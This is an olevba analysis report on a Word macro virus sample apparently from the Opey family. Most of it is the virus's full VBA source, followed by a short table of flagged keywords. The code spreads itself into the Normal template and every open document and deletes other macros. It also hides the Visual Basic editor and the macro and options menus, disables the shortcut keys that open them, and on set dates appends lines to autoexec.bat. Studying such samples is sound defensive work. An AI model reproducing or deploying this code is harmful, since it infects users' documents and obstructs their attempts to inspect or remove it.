olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-fcb9e8634e9f5287dc9a60d2383ab2d14d569627
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-fcb9e8634e9f5287dc9a60d2383ab2d14d569627 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KRF.bas 
in file: Virus.MSWord.Opey-based-fcb9e8634e9f5287dc9a60d2383ab2d14d569627 - OLE stream: 'Macros/VBA/KRF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public IND1  As String

Sub RIA()
On Error Resume Next
Call KRF
NTInfected = False
For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
clan = NormalTemplate.VBProject.VBComponents(i).Name
If clan = "KRF" Then NTInfected = True
If (clan <> "KRF") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next i
For Each opendoc In Documents
ODInfected = False
With opendoc
For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
clan = opendoc.VBProject.VBComponents(j).Name
If clan = "KRF" Then ODInfected = True
If (clan <> "KRF") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next j
If ODInfected = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="KRF", Object:=wdOrganizerObjectProjectItems
opendoc.SaveAs FileName:=opendoc.FullName
End If
End With
Next opendoc
If NTInfected = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="KRF", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End If
Call Introduce
End Sub

Sub FileSave()
On Error Resume Next
Call RIA
ActiveDocument.Save
End Sub
Sub FileClose()
On Error Resume Next
Call RIA
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
Call RIA
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
newfile$ = 1
Call RIA
End Sub
Sub AutoOpen()
On Error Resume Next
Call RIA
End Sub
Sub AutoExec()
On Error Resume Next
Call RIA
End Sub
Sub FileSaveAs()
On Error Resume Next
Call RIA
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
On Error Resume Next
Call RIA
Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
On Error Resume Next
Call RIA
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call RIA
End Sub
Sub xxx()
    open
End Sub

Sub KRF()
On Error Resume Next
Application.UserName = "Young Kim"
Application.UserAddress = "PLM"
Application.UserInitials = "KRF"
With Dialogs(wdDialogFileSummaryInfo)
.Author = "Young Kim"
.Title = "RIA"
.Execute
End With

With Options
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
With ActiveDocument
.ReadOnlyRecommended = False
End With

On Error Resume Next
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Customize...").Delete
CommandBars("Tools").Controls("Options...").Delete
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable

End Sub

Sub Introduce()
On Error Resume Next
autoexecfile$ = "c:\autoexec.bat"
hFile = FreeFile
line1$ = ""
If (Year(Date) > 2000) Then
If (Day(Date) = 22) Then
line1$ = "echo Happy KRF Day 12-22 !!!"
End If
If (line1$ <> "") And (IND1 <> "T") Then
Open autoexecfile$ For Append Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, line1$
Print #hFile, "echo from: Young Kim (PLM) 1999-2000"
Print #hFile, "pause"
IND1 = "T"
Close hFile
End If
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

